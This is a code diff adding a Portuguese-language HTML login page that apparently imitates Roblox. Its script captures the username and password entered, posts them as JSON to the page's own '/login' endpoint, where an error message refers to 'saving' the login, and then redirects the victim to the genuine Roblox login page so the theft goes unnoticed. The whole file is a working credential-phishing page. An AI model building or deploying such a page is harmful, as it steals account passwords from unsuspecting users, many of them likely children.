@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="icon" type="image/x-icon" href="R.png" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <!-- ===== MENU SUPERIOR ===== -->
+    <header class="navbar">
+      <div class="nav-left">
+        <div><img src="R.png" alt="" style="width: 20px" /></div>
+        <nav>
+          <a href="#">Destaques</a>
+          <a href="#">Mercado</a>
+          <a href="#">Criar</a>
+          <a href="#">Login</a>
+        </nav>
+      </div>
+
+      <div class="nav-center">
+        <input type="text" placeholder="Pesquisar" />
+      </div>
+
+      <div class="nav-right">
+        <button class="btn-cadastrar">Cadastrar-se</button>
+        <button class="btn-entrar">Entrar</button>
+      </div>
+    </header>
+
+    <!-- ===== FORMULÁRIO DE LOGIN ===== -->
+    <main>
+      <div class="login-container">
+        <h2>Entrar</h2>
+
+        <form id="login-form">
+          <div class="input-group">
+            <label for="usuario">Usuário / E-mail / Telefone</label>
+            <input type="text" id="usuario" name="usuario" required />
+          </div>
+
+          <div class="input-group">
+            <label for="senha">Senha</label>
+            <input type="password" id="senha" name="senha" required />
+          </div>
+
+          <button type="submit" class="btn-login">Entrar</button>
+        </form>
+
+        <div class="links">
+          <div class="divider"></div>
+          <a href="#">Esqueceu a senha ou nome de usuário?</a><br /><br />
+          <a href="#">Envie-me um código único por e-mail</a><br /><br />
+          <a href="#">Use outro dispositivo</a>
+          <div class="divider"></div>
+          <p>Não possui uma conta? <a href="#">Cadastrar-se</a></p>
+        </div>
+      </div>
+    </main>
+
+    <script>
+      const form = document.getElementById("login-form");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const usuario = document.getElementById("usuario").value;
+        const senha = document.getElementById("senha").value;
+
+        try {
+          const resposta = await fetch("/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ usuario, senha }),
+          });
+
+          if (resposta.ok) {
+            window.location.href = "https://www.roblox.com/pt/newlogin";
+          } else {
+            alert("Erro ao salvar login.");
+          }
+        } catch (erro) {
+          console.error("Erro na requisição:", erro);
+          alert("Falha na conexão com o servidor.");
+        }
+      });
+    </script>
+  </body>
+</html>
